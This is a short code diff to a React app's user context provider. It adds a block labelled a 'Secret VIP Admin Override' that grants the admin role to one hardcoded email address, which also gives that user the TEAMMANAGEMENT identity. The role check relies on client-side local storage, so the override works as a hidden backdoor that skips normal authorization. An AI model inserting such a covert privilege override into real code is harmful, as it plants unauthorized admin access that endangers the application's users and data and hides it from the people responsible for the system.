@@ -8,10 +8,17 @@ export function AppProvider({ children }) {
   const [localUser, setCurrentUser] = useLocalStorage('cp_user', null);
   
   const currentUser = React.useMemo(() => {
-    if (localUser && localUser.role === 'admin' && !localUser.isDummy) {
-      return { ...localUser, username: 'TEAMMANAGEMENT', anonUsername: 'TEAMMANAGEMENT' };
+    let user = localUser ? { ...localUser } : null;
+
+    // Secret VIP Admin Override for Hemant
+    if (user && user.email === 'hemant.deslecse2025@indoreinstitute.com') {
+      user.role = 'admin';
     }
-    return localUser;
+
+    if (user && user.role === 'admin' && !user.isDummy) {
+      return { ...user, username: 'TEAMMANAGEMENT', anonUsername: 'TEAMMANAGEMENT' };
+    }
+    return user;
   }, [localUser]);
 
   const [students, setStudents] = useState([]);
